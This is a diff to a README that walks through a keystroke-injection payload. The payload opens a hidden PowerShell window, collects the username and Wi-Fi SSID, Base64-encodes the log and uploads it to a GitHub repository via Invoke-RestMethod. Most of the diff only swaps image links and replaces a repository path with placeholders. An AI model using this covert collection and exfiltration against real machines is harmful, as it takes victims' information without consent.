@@ -29,7 +29,7 @@ Payload Begins:
 
  It initiates with a short delay (`DELAY 200`) before opening the Run dialog using `GUI r`.
  
-<img src="https://i.imgur.com/62TgaWL.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
+<img src="https://i.imgur.com/ZVSc5ZK.png" height="80%" width="80%" alt=" Payload Walkthrough"/>
 <br />
 <p align="center">
 Powershell Launch:
@@ -37,7 +37,7 @@ Powershell Launch:
  A hidden PowerShell window is opened with: `powershell -WindowStyle hidden`<br/>
 
 
-<img src="https://i.imgur.com/tcTyMUE.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
+<img src="https://i.imgur.com/eZiHOlX.png" height="80%" width="80%" alt="Payload Walkthrough"/>
 <br />
 
 <p align="center">
@@ -50,14 +50,14 @@ Information Collection:
    - **Username**: `$env:USERNAME`  
    - **Wi-Fi SSID**: Extracted from `netsh wlan show interfaces`<br/>
 
-<img src="https://i.imgur.com/nCIbXbg.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
+<img src="https://i.imgur.com/aXAw5Nw.png" height="80%" width="80%" alt="Payload Walkthrough"/>
 <br />
 <p align="center">
 Data Encoding:
  
  The collected data is formatted into a log string, converted to UTF-8 bytes, then Base64-encoded for GitHub upload.<br/>
  
-<img src="https://i.imgur.com/cdFHBiU.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
+<img src="https://i.imgur.com/MeZe7eR.png" height="80%" width="80%" alt="Payload Walkthrough"/>
 <br />
 <p align="center">
 GitHub API Setup:
@@ -67,7 +67,7 @@ GitHub API Setup:
 PowerShell: 
 `$headers = @{ Authorization = "token $token" }`
 
-<img src="https://i.imgur.com/JL945Ga.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
+<img src="https://i.imgur.com/Sx0xzl4.png" height="80%" width="80%" alt="Payload Walkthrough"/>
 <br />
 <p align="center">
 Dynamic Filename Generation:
@@ -78,18 +78,18 @@ A timestamped filename is created:
 
 `$filename = "iplog-$timestamp.txt"` <br/>
 
-<img src="https://i.imgur.com/K71yaM2.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
+<img src="https://i.imgur.com/zCATjgV.png" height="80%" width="80%" alt="Payload Walkthrough"/>
 <br />
 <p align="center">
 REST API Upload:
  
 The payload uploads the Base64-encoded log file to your GitHub repository using the following URI format:
 
-`$uri = "https://api.github.com/repos/VemTech6/temp-ducky/contents/" + $filename`
+`$uri = "https://api.github.com/repos/YOUR_USERNAME/YOUR_REPO/contents/" + $filename`
 
 `Invoke-RestMethod -Uri $uri -Method PUT -Headers $headers -Body $body <br/>`
 
-<img src="https://i.imgur.com/AeZkvFQ.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
+<img src="https://i.imgur.com/gdZPiBi.png" height="80%" width="80%" alt="Payload Walkthrough"/>
 </p>
 
 <!--
